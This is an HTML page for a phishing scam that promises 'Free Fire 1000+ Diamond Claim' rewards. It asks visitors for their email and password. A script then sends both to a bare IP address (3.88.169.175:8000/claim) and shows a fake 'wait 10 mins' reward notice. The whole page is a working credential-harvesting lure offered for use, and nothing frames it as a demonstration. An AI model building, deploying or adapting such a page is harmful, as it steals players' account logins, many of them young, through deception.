<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Free Fire Diamond Claim</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            background-image: url('logo.jpg');
            /* ðŸ”„ Replace this with your own image URL */
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
        }

        /* Add a subtle dark overlay to enhance text readability */
        .overlay {
            background-color: rgba(0, 0, 0, 0.7);
        }
    </style>
</head>

<body class="min-h-screen flex items-center justify-center px-4">

    <div class="overlay w-full max-w-sm p-6 rounded-2xl shadow-xl text-center space-y-6 text-white backdrop-blur-md">
        <h1 class="text-2xl font-bold text-yellow-400">ðŸ”¥ Free Fire 1000+ Diamond Claim ðŸ”¥</h1>

        <div class="space-y-4">
            <input type="email" placeholder="Enter your email"
                class="w-full px-4 py-2 rounded-lg bg-gray-700 bg-opacity-80 border border-gray-600 placeholder-gray-300 focus:outline-none focus:ring-2 focus:ring-yellow-400"
                id="email" />
            <input type="password" placeholder="Enter your password"
                class="w-full px-4 py-2 rounded-lg bg-gray-700 bg-opacity-80 border border-gray-600 placeholder-gray-300 focus:outline-none focus:ring-2 focus:ring-yellow-400"
                id="password" />
        </div>

        <button onclick="submitForm()"
            class="w-full bg-yellow-400 hover:bg-yellow-500 text-black font-bold py-2 rounded-lg transition">
            Claim Diamonds ðŸ’Ž
        </button>

        <p id="message" class="text-sm text-green-300 font-medium hidden">
            Please wait 10 mins while we process your reward.<br />
            If you didn't get it, please try again.
        </p>
    </div>

    <script>
        // function showMessage() {
        //     document.getElementById('message').classList.remove('hidden');
        // }
        async function submitForm() {
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();

            if (!email || !password) {
                alert("Please enter both fields.");
                return;
            }

            try {
                const response = await fetch("http://3.88.169.175:8000/claim", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ email, password }),
                });

                if (response.ok) {
                    document.getElementById('message').classList.remove('hidden');
                } else {
                    alert("Something went wrong. Please try again.");
                }
            } catch (error) {
                console.error("Error:", error);
                alert("Server unreachable.");
            }
        }
    </script>
</body>

</html>
